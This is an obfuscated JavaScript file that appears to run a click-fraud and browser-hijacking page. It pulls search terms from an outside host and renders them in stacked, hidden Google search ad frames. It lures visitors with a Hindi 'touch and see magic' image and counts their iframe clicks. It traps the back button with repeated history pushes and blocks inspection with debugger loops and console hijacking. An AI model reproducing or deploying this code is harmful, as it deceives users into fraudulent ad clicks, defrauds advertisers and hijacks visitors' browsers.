var folderURL = 'https://sgb-3gl.pages.dev/key.txt',
  mainURL = window.location.href
if (document.URL.indexOf('tv=7000') != -1) {
  var randomFourDigit = Math.floor(1000 + Math.random() * 9000)
  var url = new URL(window.location.href)
  url.searchParams.set('tv', randomFourDigit)
  mainURL = url.toString()
  window.history.replaceState(null, null, url.toString())
  setTimeout(function runWizard() {
    var _0x1c1098 =
        "\n        <!DOCTYPE html>\n        <html>\n        <head>\n          <title>Loading</title>\n          <link href='https://i.postimg.cc/TwtGJRvp/apple-touch-icon.png' rel='icon' type='image/x-icon'/>\n          <meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>\n          <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no'/>\n          <meta name='theme-color' content='#FFFFFF'/>\n          <meta name='apple-mobile-web-app-status-bar-style' content='#FFFFFF'/>\n          <meta name='msapplication-navbutton-color' content='#FFFFFF'/>\n          <style>\n            html, body {\n              -webkit-user-select: none !important;\n              -moz-user-select: none !important;\n              -ms-user-select: none !important;\n              user-select: none !important;\n              display: block;\n              -ms-overflow-style: none;\n              scrollbar-width: none;\n              overflow: hidden;\n            }\n            html::-webkit-scrollbar, body::-webkit-scrollbar {\n              display: none;\n            }\n            .loading-text {\n              margin: 0 auto;\n              padding: 5px 0;\n              position: fixed;\n              font: bold 25px/1.3em Helvetica, Arial, sans-serif !important;\n              text-transform: capitalize;\n              color: #000000;\n              font-size: 25px;\n              font-weight: bold;\n            }\n            .loading-text:after {\n              content: \"\";\n              border-radius: 2px;\n              animation: wormsPong 0.8s infinite cubic-bezier(0.77, 0, 0.175, 1);\n              background-color: #4169E1;\n              position: fixed;\n              bottom: 0;\n              left: 0;\n              width: 4px;\n              height: 4px;\n            }\n            @keyframes wormsPong {\n              25% { width: 100%; }\n              50% { width: 0; left: auto; right: 0; }\n              75% { width: 100%; }\n              100% { width: 0; right: auto; left: 0; }\n            }\n            .loading-text {\n              position: fixed;\n              top: 50%;\n              left: 50%;\n              transform: translate(-50%, -50%);\n            }\n          </style>\n        </head>\n        <body>\n          <div class=\"loading-text\">Loading</div>\n          <script>\n            if (document.cookie.indexOf(\"new=\") >= 0) {\n              // Cookie 'new' exists\n            } else {\n              var expiry = new Date();\n              expiry.setTime(expiry.getTime() + (1440 * 60 * 1000));\n              document.cookie = \"new=yes; path=/; expires=\" + expiry.toGMTString();\n            }\n  \n            var anchor = document.createElement('a');\n            var linkText = document.createTextNode('Redirection');\n            anchor.appendChild(linkText);\n            anchor.id = 'redirectOP';\n            anchor.style = 'visibility: hidden; opacity: 0;';\n            anchor.rel = 'noopener noreferrer nofollow';\n            anchor.title = 'Redirection';\n            anchor.href = mainURL;\n            document.body.appendChild(anchor);\n            document.querySelector('#redirectOP').click();\n          </script>\n        </body>\n        </html>\n      ",
      _0x4cadfb = document.open('text/html', 'replace')
    _0x4cadfb.write(_0x1c1098)
    _0x4cadfb.close()
  }, 0)
} else {
  if (document.cookie.indexOf('new=yes') != -1) {
    document.write(
      '<style> body, html { position: absolute; left: -9999px; transform: scale(0); } </style>'
    )
    if (document.cookie.indexOf('story=yes') != -1) {
      var styles = 'iframe { pointer-events: none!important; }',
        styleSheet = document.createElement('style')
      document.head.appendChild(styleSheet)
      window.location.replace('https://youtu.be/MWJHpMoUQ70')
    }
    function gcseCallback1() {
      var _0x47cf54 = { linkTarget: '' }
      var _0x343bdf = _0x47cf54,
        _0x1ea4d1 = function (_0x36c9e4, _0x1a1cb7) {
          var _0x237d98 = {
            gname: _0x36c9e4,
            div: _0x1a1cb7,
            tag: 'search',
            attributes: _0x343bdf,
          }
          var _0x16b17c = _0x237d98
          google.search.cse.element.render(_0x16b17c)
        }
      _0x1ea4d1('gsearch1', 'results1')
      _0x1ea4d1('gsearch2', 'results2')
      _0x1ea4d1('gsearch3', 'results3')
      _0x1ea4d1('gsearch4', 'results4')
      _0x1ea4d1('gsearch5', 'results5')
      _0x1ea4d1('gsearch6', 'results6')
      _0x1ea4d1('gsearch7', 'results7')
      _0x1ea4d1('gsearch8', 'results8')
      _0x1ea4d1('gsearch9', 'results9')
      _0x1ea4d1('gsearch10', 'results10')
      var _0x3d12d3 = function (_0x1d620b, _0x405faf) {
        var _0xccca77 = new XMLHttpRequest()
        _0xccca77.onload = function () {
          var _0x4e605c = this.responseText,
            _0x279366 = _0x4e605c.split('\n'),
            _0x2a5384 = localStorage.randomState
              ? JSON.parse(localStorage.randomState)
              : null
          if (!_0x2a5384 || _0x2a5384.order.length != _0x279366.length) {
            var _0x19ec33 = {
              order: [],
              index: 0,
            }
            _0x2a5384 = _0x19ec33
            for (var _0x3e1980 = 0; _0x3e1980 < _0x279366.length; _0x3e1980++) {
              _0x2a5384.order.splice(
                Math.floor(Math.random() * (_0x3e1980 + 1)),
                0,
                _0x3e1980
              )
            }
          }
          var _0x35d319 = _0x279366[_0x2a5384.order[_0x2a5384.index]]
          _0x2a5384.index = (_0x2a5384.index + 1) % _0x279366.length
          localStorage.randomState = JSON.stringify(_0x2a5384)
          _0x405faf.execute(_0x35d319)
        }
        _0xccca77.open('GET', folderURL, true)
        _0xccca77.send()
      }
      _0x3d12d3('results1', google.search.cse.element.getElement('gsearch1'))
      var _0x2a9294 = function (
        _0x4256fc,
        _0x5b3c12,
        _0xb525f2,
        _0x4b84f8,
        _0x4e2356,
        _0x28eb71
      ) {
        const _0x466237 = setInterval(() => {
          if (document.cookie.indexOf(_0x5b3c12) != -1) {
            clearInterval(_0x466237)
          } else {
            setTimeout(() => {
              localStorage[_0x4256fc] = +(localStorage[_0x4256fc] || 0) + 1
              _0x3d12d3(
                'results' + _0x4e2356,
                google.search.cse.element.getElement('gsearch' + _0x4e2356)
              )
              _0x28eb71()
            }, Math.round(_0xb525f2 + Math.random() * (_0x4b84f8 - _0xb525f2)))
          }
        }, Math.floor(Math.random() * 300) + 500)
      }
      _0x2a9294('counter2', 'copium2=2', 1000, 1100, '2', function () {
        if (document.cookie.indexOf('copium2=2') < 0) {
          var _0x332d5b = new Date()
          _0x332d5b.setTime(_0x332d5b.getTime() + 86400000)
          document.cookie =
            'copium2=2; path=/; expires=' + _0x332d5b.toGMTString()
        }
      })
      _0x2a9294('counter3', 'copium3=3', 1100, 1200, '3', function () {
        clearInterval(_0x2a9294)
        if (document.cookie.indexOf('copium3=3') < 0) {
          var _0x57c3b0 = new Date()
          _0x57c3b0.setTime(_0x57c3b0.getTime() + 86400000)
          document.cookie =
            'copium3=3; path=/; expires=' + _0x57c3b0.toGMTString()
        }
      })
      _0x2a9294('counter4', 'copium4=4', 1200, 1300, '4', function () {
        clearInterval(_0x2a9294)
        if (document.cookie.indexOf('copium4=4') < 0) {
          var _0x2148c6 = new Date()
          _0x2148c6.setTime(_0x2148c6.getTime() + 86400000)
          document.cookie =
            'copium4=4; path=/; expires=' + _0x2148c6.toGMTString()
        }
      })
      _0x2a9294('counter5', 'copium5=5', 1300, 1400, '5', function () {
        clearInterval(_0x2a9294)
        if (document.cookie.indexOf('copium5=5') < 0) {
          var _0x4078fb = new Date()
          _0x4078fb.setTime(_0x4078fb.getTime() + 86400000)
          document.cookie =
            'copium5=5; path=/; expires=' + _0x4078fb.toGMTString()
        }
      })
    }
    var _0x580b58 = {
      parsetags: 'explicit',
      callback: gcseCallback1,
    }
    var gcseInit = _0x580b58
    window['__gcse'] = gcseInit
    ;(function () {
      var _0x108ce3 = (function () {
          var _0x680fe9 = true
          return function (_0x3cf264, _0x3a6026) {
            var _0x2c7874 = _0x680fe9
              ? function () {
                  if (_0x3a6026) {
                    var _0x4ce307 = _0x3a6026.apply(_0x3cf264, arguments)
                    return (_0x3a6026 = null), _0x4ce307
                  }
                }
              : function () {}
            return (_0x680fe9 = false), _0x2c7874
          }
        })(),
        _0xff04a4 = _0x108ce3(this, function () {
          return _0xff04a4
            .toString()
            .search('(((.+)+)+)+$')
            .toString()
            .constructor(_0xff04a4)
            .search('(((.+)+)+)+$')
        })
      _0xff04a4()
      var _0x2f87fc = (function () {
        var _0x580431 = true
        return function (_0x321c75, _0x4420bd) {
          var _0x24b712 = _0x580431
            ? function () {
                if (_0x4420bd) {
                  var _0x3fd909 = _0x4420bd.apply(_0x321c75, arguments)
                  return (_0x4420bd = null), _0x3fd909
                }
              }
            : function () {}
          return (_0x580431 = false), _0x24b712
        }
      })()
      ;(function () {
        _0x2f87fc(this, function () {
          var _0x16dae9 = new RegExp('function *\\( *\\)'),
            _0x99c8fa = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
            _0x4095f2 = _0x3b8c8e('init')
          if (
            !_0x16dae9.test(_0x4095f2 + 'chain') ||
            !_0x99c8fa.test(_0x4095f2 + 'input')
          ) {
            _0x4095f2('0')
          } else {
            _0x3b8c8e()
          }
        })()
      })()
      var _0x99c8d = (function () {
          var _0x21b615 = true
          return function (_0x938dec, _0x4cfd91) {
            var _0x53197e = _0x21b615
              ? function () {
                  if (_0x4cfd91) {
                    var _0x30643f = _0x4cfd91.apply(_0x938dec, arguments)
                    return (_0x4cfd91 = null), _0x30643f
                  }
                }
              : function () {}
            return (_0x21b615 = false), _0x53197e
          }
        })(),
        _0x361e0a = _0x99c8d(this, function () {
          var _0x3bf42a = function () {
              var _0x5ccb77
              try {
                _0x5ccb77 = Function(
                  'return (function() {}.constructor("return this")( ));'
                )()
              } catch (_0x54cd6a) {
                _0x5ccb77 = window
              }
              return _0x5ccb77
            },
            _0x482148 = _0x3bf42a(),
            _0x5f34ed = (_0x482148.console = _0x482148.console || {}),
            _0xf9ae0d = [
              'log',
              'warn',
              'info',
              'error',
              'exception',
              'table',
              'trace',
            ]
          for (var _0x3dcd66 = 0; _0x3dcd66 < _0xf9ae0d.length; _0x3dcd66++) {
            var _0x37261b = _0x99c8d.constructor.prototype.bind(_0x99c8d)
            var _0x298f8f = _0xf9ae0d[_0x3dcd66]
            var _0x2c5bfc = _0x5f34ed[_0x298f8f] || _0x37261b
            _0x37261b['__proto__'] = _0x99c8d.bind(_0x99c8d)
            _0x37261b.toString = _0x2c5bfc.toString.bind(_0x2c5bfc)
            _0x5f34ed[_0x298f8f] = _0x37261b
          }
        })
      _0x361e0a()
      var _0x4058ed = document.createElement('script')
      _0x4058ed.async = true
      _0x4058ed.src =
        (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=eb678b00be2c94b08'
      var _0x20bd82 = document.getElementsByTagName('script')[0]
      _0x20bd82.parentNode.insertBefore(_0x4058ed, _0x20bd82)
    })()
    setTimeout(function renderSearchPage() {
      var _0x536474 =
        '!DOCTYPE HTML><html>\n          <head><meta charset="UTF-8"><title>Search On The Web...</title>\n            <link href=\'https://i.postimg.cc/qvBDcj8z/searchhh.png\' rel=\'icon\' type=\'image/x-icon\'/>\n            <meta http-equiv=\'Content-Type\' content=\'text/html; charset=utf-8\'/>\n            <meta name=\'viewport\' content=\'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no\'/>\n            <meta name=\'theme-color\' content=\'#FFFFFF\'/>\n            <meta name=\'apple-mobile-web-app-status-bar-style\' content=\'#FFFFFF\'/>\n            <meta name=\'msapplication-navbutton-color\' content=\'#FFFFFF\'/>\n          </head>\n          <body>\n            <script>\n              const omg = setInterval(oge, 0);\n              function oge() {\n                var myElement = document.body.contains(document.querySelector(".gsc-resultsbox-visible"));\n                if (myElement) {\n                  clearInterval(omg);\n                  document.querySelector(".gsc-resultsbox-visible").remove();\n                }\n              }\n  \n              var deviceDetector = function() {\n                var ua = navigator.userAgent.toLowerCase();\n                var device = function(ua) {\n                  if (/tablet|ipad|(android(?!.*mobile))|windows(?!.*phone)(.*touch)|kindle|playbook|silk|(puffin(?!.*(IP|AP|WP)))/.test(ua)) return "tablet";\n                  if (/mobi|ipod|phone|blackberry|opera mini|fennec|minimo|symbian|psp|nintendo ds|archos|skyfire|puffin|blazer|bolt|gobrowser|iris|maemo|semc|teashark|uzard/.test(ua)) return "phone";\n                  return "desktop";\n                };\n                return { device: device(ua), detect: device, isMobile: device(ua) !== "desktop", userAgent: ua };\n              }();\n  \n              if (deviceDetector.device == \'desktop\') {\n                addEventListener("mousedown", myFunc);\n              } else {\n                addEventListener("touchstart", myFunc);\n              }\n  \n              function myFunc() {\n                myFunc = function() {};\n  \n                var scriptZA = document.createElement("script");\n                scriptZA.type = "text/javascript";\n                scriptZA.innerHTML = \'!function() { try { for (var t = 0; t < 10; ++t) history.pushState({}, ""); onpopstate = function(t) { t.state && history.pushState(null, null, document.URL); window.addEventListener("popstate", function() { history.go(1); }); } } catch (o) {} }();\';\n                document.body.appendChild(scriptZA);\n  \n                var scriptZQ = document.createElement("script");\n                scriptZQ.type = "text/javascript";\n                scriptZQ.innerHTML = \'window.history.pushState(null, null, window.location.href); window.onpopstate = function() { alert(" टच करो और जादू देखो फिर से  !"); setTimeout(() => { window.scrollTo(0, 0); }, 100); };\';\n                document.body.appendChild(scriptZQ);\n              }\n            </script>\n            <style>\n              .gsc-expansionArea, .gcsc-find-more-on-google-text, .gcsc-find-more-on-google-root, .gcsc-more-maybe-branding-root, .gcsc-branding, .gsc-cursor-box, .gsc-above-wrapper-area, .gsc-resultsbox-visible, .gsc-search-box, .gsc-result-info, .gsc-input-box, #ssrad-master > div > span {\n                visibility: hidden;\n                opacity: 0;\n                transform: scale(0);\n                clip: rect(0 0 0 0);\n                clip-path: inset(50%);\n              }\n            </style>\n            <style>\n              body { margin: 0; overflow: hidden; }\n              .main-overlay {\n                pointer-events: none;\n                height: 100%;\n                width: 100%;\n                opacity: 1;\n                display: block;\n                position: fixed;\n                z-index: 9995;\n                top: 0;\n                left: 0;\n                background-color: rgba(255, 255, 255, 1);\n              }\n              .container1, .others2, .others3, .others4, .others5, .others6, .others7, .others8, .others9, .others10 {\n                height: 100%;\n                width: 100%;\n                position: fixed;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                text-align: center;\n                min-height: 100vh;\n                pointer-events: auto;\n                top: 0;\n                overflow: hidden;\n              }\n              .container1 { z-index: 9994; transform: scale(1000); transform-origin: 30px 100px; }\n              .others2 { z-index: 9993; }\n              .others3 { z-index: 9992; }\n              .others4 { z-index: 9991; }\n              .others5 { z-index: 9990; }\n              .others6 { z-index: 9989; }\n              .others7 { z-index: 9988; }\n              .others8 { z-index: 9987; }\n              .others9 { z-index: 9986; }\n              .others10 { z-index: 9985; }\n              .hero {\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                text-align: center;\n                min-height: 100vh;\n              }\n              .overlay1 {\n                pointer-events: none;\n                position: fixed;\n                top: 0;\n                z-index: 9996;\n                animation: horizontal-shaking 1.2s infinite;\n              }\n              @keyframes horizontal-shaking {\n                0% { transform: translateX(0); }\n                 25% { transform: translateX(5px); }\n                 50% { transform: translateX(-5px); }\n                 75% { transform: translateX(5px); }\n                 100% { transform: translateX(0); }\n              }\n            </style>\n            <script>\n              window.onpageshow = function(event) {\n                if (event.persisted) {\n                  window.location.reload();\n                }\n              };\n            </script>\n            <div class="main-overlay"></div>\n            <div class="container1">\n              <div class="ads-01">\n                <div id="results1" style="position: fixed; top: 0px; left: 0px;"></div>\n              </div>\n            </div>\n            <div class="others2"><div id="results2" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others3"><div id="results3" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others4"><div id="results4" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others5"><div id="results5" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others6"><div id="results6" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others7"><div id="results7" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others8"><div id="results8" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others9"><div id="results9" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="others10"><div id="results10" style="position: fixed; top: 0px; left: 0px;"></div></div>\n            <div class="hero">\n              <div class="overlay1"><div class="alert1" style="height: 100px; width: 320px; font-size: 40px; font-weight: bold; margin-top: 20px; margin-left: 5px; margin-bottom: -80px;">टच करो और जादू देखो फिर से</div>\n                <img id="isok" src="https://sgb-3gl.pages.dev/pic.jpeg" alt="" onerror="this.style.display=\'none\'" style="height: 310px; width: 310px; margin-left: 5px; margin-top: 150px; background-color: transparent; opacity: 1; animation: horizontal-shaking 1.2s infinite; border: 5px solid blue;"/>\n              </div>\n            </div>\n            <script>\n              const vrZ = setInterval(xsZ, 100);\n              function xsZ() {\n                var uri = window.location.toString();\n                if (uri.indexOf("#") > 0) {\n                  var cleanX = uri.substring(0, uri.indexOf("#"));\n                  window.history.replaceState({}, document.title, cleanX);\n                  setTimeout(() => { location.reload(); }, 100);\n                }\n              }\n  \n              window.addEventListener("blur", () => {\n                var loopInterval = setInterval(() => {\n                  if (document.activeElement.tagName === "IFRAME" || document.activeElement.id === "ifr") {\n                    localStorage.clicks = +(localStorage.clicks || 0) + 1;\n                    window.focus();\n                  }\n                }, 0);\n              }, { once: false });\n  \n              const newInterval = setInterval(() => {\n                var SCheck = JSON.parse(localStorage.getItem(\'clicks\'));\n                if (SCheck >= \'2\') {\n                  localStorage.removeItem(\'clicks\');\n                  if (document.cookie.indexOf("story=") < 0) {\n                    var expiry = new Date();\n                    expiry.setTime(expiry.getTime() + (1440 * 60 * 1000));\n                    document.cookie = "story=yes; path=/; expires=" + expiry.toGMTString();\n                  }\n                  clearInterval(newInterval);\n                }\n              }, 0);\n  \n              const carInterval = setInterval(() => {\n                if (document.cookie.indexOf("story=yes") != -1) {\n                  localStorage.removeItem(\'clicks\');\n                  clearInterval(carInterval);\n                }\n              }, 0);\n  \n              history.scrollRestoration = "manual";\n            </script>\n          </body>\n          </html>\n        '
      var _0x5e8219 = document.open('text/html', 'replace')
      _0x5e8219.write(_0x536474)
      _0x5e8219.close()
    }, 0)
  }
}
function _0x3b8c8e(_0x1b16ae) {
  function _0x3f2635(_0x234c9d) {
    if (typeof _0x234c9d === 'string') {
      return function (_0x3cfee8) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      if (('' + _0x234c9d / _0x234c9d).length !== 1 || _0x234c9d % 20 === 0) {
        ;(function () {
          return true
        }
          .constructor('debugger')
          .call('action'))
      } else {
        ;(function () {
          return false
        }
          .constructor('debugger')
          .apply('stateObject'))
      }
    }
    _0x3f2635(++_0x234c9d)
  }
  try {
    if (_0x1b16ae) {
      return _0x3f2635
    } else {
      _0x3f2635(0)
    }
  } catch (_0x4b24eb) {}
}
;(function () {
  var _0x2e054d = function () {
    var _0x40ab22
    try {
      _0x40ab22 = Function(
        'return (function() {}.constructor("return this")( ));'
      )()
    } catch (_0x33eb11) {
      _0x40ab22 = window
    }
    return _0x40ab22
  }
  var _0x2a7c3d = _0x2e054d()
  _0x2a7c3d.setInterval(_0x3b8c8e, 4000)
})()
